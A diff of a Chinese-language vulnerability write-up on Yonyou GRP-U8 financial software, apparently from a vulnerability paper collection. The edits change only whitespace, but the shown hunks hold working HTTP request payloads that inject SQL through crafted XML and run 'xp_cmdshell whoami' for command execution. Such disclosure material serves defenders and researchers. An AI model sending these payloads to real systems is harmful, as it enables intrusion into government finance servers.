@@ -9,7 +9,7 @@ source: "MrWQ/vulnerability-paper"
 
 ### **一、漏洞介绍**
 
- 用友 GRP-U8 行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。用友 GRP-u8 被曝存在 XXE 漏洞，该漏洞源于应用程序解析 XML 输入时没有限制外部实体的加载，导致可加载恶意外部文件，可以执行 SQL 语句，甚至可以执行系统命令。
+ 用友 GRP-U8 行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。用友 GRP-u8 被曝存在 XXE 漏洞，该漏洞源于应用程序解析 XML 输入时没有限制外部实体的加载，导致可加载恶意外部文件，可以执行 SQL 语句，甚至可以执行系统命令。
 
 ### **二、影响版本**
 
@@ -38,7 +38,7 @@ Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0
 Connection: close  
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 386  
-   
+   
 cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbgr0vic8FYm8C9QZdqicv9JyG0kPwQXNZZ4TgXr9GQ8icUmuNJ6YH4Zl9g/640?wx_fmt=png)
@@ -91,7 +91,7 @@ Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0
 Connection: close  
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 357  
-   
+   
 cVer=9.8.0&dp=<?xml version="1.0"encoding="GB2312"?><R9PACKETversion="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATAformat="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATAformat="text">exec xp_cmdshell'whoami'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/eqGGHicCG3MaV90ZgbJcCFIkrHEkfy7rbONyrHibCbaWKhZTSGp4t5Bkg9libyIAATqxjd3zMb8R2sf9bHUspjkdA/640?wx_fmt=png)
